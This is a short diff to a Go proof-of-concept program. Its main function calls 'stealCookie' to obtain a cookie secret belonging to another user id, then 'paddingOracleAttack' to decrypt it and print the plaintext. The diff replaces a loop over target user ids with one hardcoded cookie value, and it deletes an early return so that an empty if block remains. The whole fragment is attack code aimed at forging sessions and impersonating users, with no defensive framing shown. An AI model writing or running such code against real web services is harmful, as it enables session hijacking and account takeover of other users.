@@ -184,14 +184,13 @@ func examplePOA(secret string, cookieUserId, desiredUserId uint) {
 	realSecret := stealCookie(secret, cookieUserId, desiredUserId)
 	fmt.Println(len(realSecret))
 	if len(realSecret) != 64 {
-		return
 	}
 	plainSecret := paddingOracleAttack(realSecret, desiredUserId)
 	fmt.Printf("Plain secret: '%v'\n", plainSecret)
 }
 
 func main() {
-	for i := 10; i < 70; i++ {
-		examplePOA("X8pieqciaGwScCfFVYUQIA==", 80, uint(i))
-	}
+	secret := stealCookie("yBVMFifCJpOCZcInc27mWg==", 27, 26)
+	fmt.Println(secret)
+	examplePOA("yBVMFifCJpOCZcInc27mWg==", 27, 26)
 }
